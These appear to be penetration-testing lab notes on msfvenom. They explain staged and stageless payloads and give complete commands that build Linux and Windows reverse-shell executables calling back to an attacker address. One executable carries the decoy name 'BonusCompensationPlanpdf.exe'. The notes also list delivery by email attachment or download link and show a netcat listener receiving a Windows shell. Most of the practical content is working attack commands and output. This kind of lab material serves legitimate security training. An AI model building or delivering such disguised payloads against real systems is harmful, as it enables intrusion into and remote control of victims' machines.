## Practicing with MSFvenom
We can issue the command `msfvenom -l payloads` to list all the available payloads.

First of all, we can see that the payload naming convention almost always starts by listing the OS of the target (`Linux`, `Windows`, `MacOS`, `mainframe`, etc...). We can also see that some payloads are described as (`staged`) or (`stageless`). Let's cover the difference.

## Staged vs. Stageless Payloads
`Staged` payloads create a way for us to send over more components of our attack. We can think of it like we are "setting the stage" for something even more useful. Take for example this payload `linux/x86/shell/reverse_tcp`. When run using an exploit module in Metasploit, this payload will send a small `stage` that will be executed on the target and then call back to the `attack box` to download the remainder of the payload over the network, then executes the shellcode to establish a reverse shell.

`Stageless` payloads do not have a stage. Take for example this payload `linux/zarch/meterpreter_reverse_tcp`. Using an exploit module in Metasploit, this payload will be sent in its entirety across a network connection without a stage. This could benefit us in environments where we do not have access to much bandwidth and latency can interfere. Staged payloads could lead to unstable shell sessions in these environments, so it would be best to select a stageless payload.
In addition to this, stageless payloads can sometimes be better for evasion purposes due to less traffic passing over the network to execute the payload, especially if we deliver it by employing social engineering.

The `name` will give you your first marker. Take our examples from above, `linux/x86/shell/reverse_tcp` is a staged payload, and we can tell from the name since each / in its name represents a stage from the shell forward. So `/shell/` is a stage to send, and `/reverse_tcp` is another. -> Staged

Take our example `linux/zarch/meterpreter_reverse_tcp`. It is similar to the staged payload except that it specifies the architecture it affects, then it has the shell payload and network communications all within the same function `/meterpreter_reverse_tcp`. -> Stageless

windows/meterpreter/reverse_tcp -> Staged
windows/meterpreter_reverse_tcp -> Stageless

## Building A Stageless Payload

```shell
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

## Executing a Stageless Payload

At this point, we have the payload created on our attack box. We would now need to develop a way to get that payload onto the target system. There are countless ways this can be done. Here are just some of the common ways:
- Email message with the file attached.
- Download link on a website.
- Combined with a Metasploit exploit module (this would likely require us to already be on the internal network).
- Via flash drive as part of an onsite penetration test.

Once the file is on that system, it will also need to be executed.

## Building a simple Stageless Payload for a Windows system

We can also use msfvenom to craft an executable (`.exe`) file that can be run on a Windows system to provide a shell.
```shell
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```

This is another situation where we need to be creative in getting this payload delivered to a target system. Without any `encoding` or `encryption`, the payload in this form would almost certainly be detected by Windows Defender AV.

Execute the payload on the target machine.
Get the shell:
```shell
$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.144.5 49679
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\htb-student\Downloads>
```